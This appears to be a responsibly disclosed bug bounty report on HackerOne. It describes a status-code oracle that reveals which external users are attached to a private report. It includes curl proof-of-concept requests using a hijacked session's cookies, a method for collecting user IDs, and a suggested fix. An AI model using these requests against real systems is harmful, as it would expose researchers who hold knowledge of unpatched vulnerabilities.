  "vulnerability_information": "It is possible to verify whether a specific user is invited to participate _as an external user_ to a specific report.\nThus it is possible to enumerate all external users added to a specific (non-public) report of interest.\n\n**PoC:**\n```curl 'https://hackerone.com/reports/(**report_id**)/external_users/(**user_id**)' -X DELETE -H 'User-Agent: Mozilla/5.0' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'X-CSRF-Token: (**session**)' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: (**session**)' -D-```\n\n```session``` parameters must be copied from a recent request in legitimate user's session.\n\nDifferent HTTP status codes will be returned depending on whether the user is participating as an external user for a specific report:\n - HTTP/1.1 404 Not Found => **yes**\n - HTTP/1.1 500 Internal Server Error => **no**\n - (HTTP/1.1 412 Precondition Failed means you provided invalid session parameters)\n\n\n```user_id``` can either be enumerated from 1000 up, or for a more realistic scenario, user ID can be gathered from https://hackerone.com/leaderboard/all-time or https://hackerone.com/hacktivity/new.\nID of a specific username can of course be pulled by any visitor even without authentication: ```curl 'https://hackerone.com/(**username**)' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'X-Requested-With: XMLHttpRequest'``` \n\n**Impact:**\nThis vulnerability may prove critical for non-resolved reports. This basically provides an attacker a list of researchers who know about an existing 0day and are not getting paid.\n\nUnfortunately more and more of the researchers on h1 are proving to be greedy (see #154096 et al.) or at least \"in-for-the-money\". These people could easily succumb to a black market offer from the attacker and you've just given him the list of researchers to contact.\n\n**Suggested fix:**\nCheck access rights to the report_id first and make sure to return the same status code and content in both cases. For extra measure make sure to drop out of execution flow at a single location to curb timing side channel attacks.",
